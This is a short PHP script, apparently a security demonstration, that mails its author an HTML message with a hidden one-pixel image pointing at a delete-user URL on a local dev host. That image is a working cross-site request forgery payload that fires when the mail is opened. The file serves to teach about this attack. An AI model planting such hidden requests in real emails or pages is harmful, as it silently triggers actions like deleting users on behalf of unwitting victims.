<?php
// send yourself an e-mail with a CSRF link in it

$content = <<<HERE
Hoi Bart,

De user joop ben je nu kwijt!

<img src="http://security.dev/csrf/delete-user.php?userId=2" width="1" height="1" />

Met vriendelijke groet,

Bart McLeod

HERE;

$headers = [
	'X-Mailer-From: ' . phpversion(),
	'From: mcleod@spaceweb.nl',
];

$flatHeaders = implode( '\r\n', $headers );
if ( mail( 'mcleod@spaceweb.nl', 'csrf example', $content, $flatHeaders ) ) {
	exit ( 'mail sent' );
}

exit( 'Mail not sent' );
